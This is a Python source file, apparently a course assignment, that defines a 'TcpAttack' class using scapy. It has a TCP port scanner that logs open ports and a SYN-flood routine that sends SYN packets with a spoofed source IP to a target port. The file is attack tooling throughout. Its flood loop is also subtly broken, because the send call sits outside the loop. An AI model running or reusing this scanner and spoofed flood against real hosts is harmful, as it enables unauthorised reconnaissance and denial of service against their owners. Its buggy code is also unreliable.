import sys, socket
import re
import os.path
from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether, UDP, RandShort

class TcpAttack():
    
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        verbosity = 0; 
        open_ports = []                                                              #(5)
# Scan the ports in the specified range:
        
        for testport in range(rangeStart, rangeEnd+1):                               #(6)
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               #(7)
            sock.settimeout(0.1)                                                     #(8)
            try:                                                                     #(9)
                sock.connect((self.targetIP, testport) )                                 #(10)
                open_ports.append(testport)                                          #(11)
                if verbosity: print(testport)                                        #(12)
                sys.stdout.write("%s" % testport)                                    #(13)
                sys.stdout.flush()                                                   #(14)
            except:                                                                  #(15)
                if verbosity: print("Port closed: "), testport                        #(16)
                sys.stdout.write(".")                                                #(17)
                sys.stdout.flush()                                                   #(18)
                                                             #(27)
        service_ports = {}   
        OUT = open("openports.txt", 'w')                                             #(28)
        if not open_ports:                                                           #(29)
            print("\n\nNo open ports in the range specified\n")                       #(30)    
        else:
            print ("\n\nThe open ports:\n\n");                                         #(31)    
            for k in range(0, len(open_ports)):                                      #(32)
                if len(service_ports) > 0:                                           #(33)
                    for portname in sorted(service_ports):                           #(34)
                        pattern = r'^' + str(open_ports[k]) + r'/'                   #(35)
                        if re.search(pattern, str(portname)):                        #(36)
                            print("%d:    %s" %(open_ports[k], service_ports[portname]))
                                                                             #(37)
                else:
                    print(open_ports[k])                                             #(38)
                OUT.write("%s\n" % open_ports[k])                                    #(39)
        OUT.close()

    def attackTarget(self, port, numSyn):

        srcIP    = self.spoofIP                                                      #(1)
        destIP   = self.targetIP                                                     #(2)
        destPort = port                                                 #(3)
        count    = numSyn                                                 #(4)

        for i in range(count):                                                       #(5)
            IP_header = IP(src = srcIP, dst = destIP)                                #(6)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
            packet = IP_header / TCP_header                                          #(8)
        try:                                                                     #(9)
            send(packet)                                                          #(10)
        except Exception as e:                                                   #(11)
            print(e)    